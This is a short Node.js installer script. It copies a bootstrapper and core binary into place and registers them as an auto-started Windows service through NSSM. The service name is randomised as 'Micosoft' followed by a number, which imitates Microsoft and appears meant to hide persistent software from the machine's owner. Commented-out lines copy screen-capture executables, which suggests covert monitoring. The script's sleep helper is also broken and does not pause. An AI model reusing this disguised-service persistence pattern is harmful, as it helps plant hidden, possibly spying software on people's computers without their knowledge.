const fs = require("fs");
const { execSync } = require("child_process");
const { STOPPED, waitForServiceStatus } = require("./status");

// const INSTALL_PATH = "C:\\ProgramData\\nssm\\";
// const BACKEND_NAME = "backend.exe";
// const BACKEND_PATH = `${INSTALL_PATH}${BACKEND_NAME}`;
// const NSSM_PATH = `${INSTALL_PATH}nssm.exe`;

const gConfig = require("../../my_config");

// const SERVICE_NAME = "ammc";

let NEW_SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;

async function install() {
  try {
    let rs;
    fs.mkdirSync(gConfig.INSTALL_PATH, { recursive: true });
    fs.copyFileSync("./nssm.exe", gConfig.NSSM_PATH);
    // fs.copyFileSync("./myScreenshot.exe", `${INSTALL_PATH}myScreenshot.exe`);
    // fs.copyFileSync(
    //   "./screenCapture_1.3.2.exe",
    //   `${INSTALL_PATH}screenCapture_1.3.2.exe`
    // );
    // fs.copyFileSync("./" + BACKEND_NAME, BACKEND_PATH);
    fs.copyFileSync("./bootstrapper.exe", `${gConfig.BOOTSTRAPPER_PATH}`);
    fs.copyFileSync("./serviceCore", `${gConfig.CORE_PATH}`);
    // sleep(1000);
    execSync(
      `${gConfig.NSSM_PATH} install ${NEW_SERVICE_NAME} ${gConfig.BOOTSTRAPPER_PATH}`
    );
    // 检测服务是否安装完毕
    await waitForServiceStatus(NEW_SERVICE_NAME, STOPPED);
    execSync(`${gConfig.NSSM_PATH} start ${NEW_SERVICE_NAME}`);
    fs.writeFileSync(
      `${gConfig.INSTALL_PATH}serviceName`,
      `${NEW_SERVICE_NAME}%%${gConfig.BOOTSTRAPPER_NAME}`
    );
    console.log("安装完毕");
    sleep(1000);
  } catch (e) {
    console.log(e);
    sleep(10000);
  }
}

function sleep(msec) {
  setTimeout(async function () {
    await new Promise((r) => r);
  }, msec);
}

install();
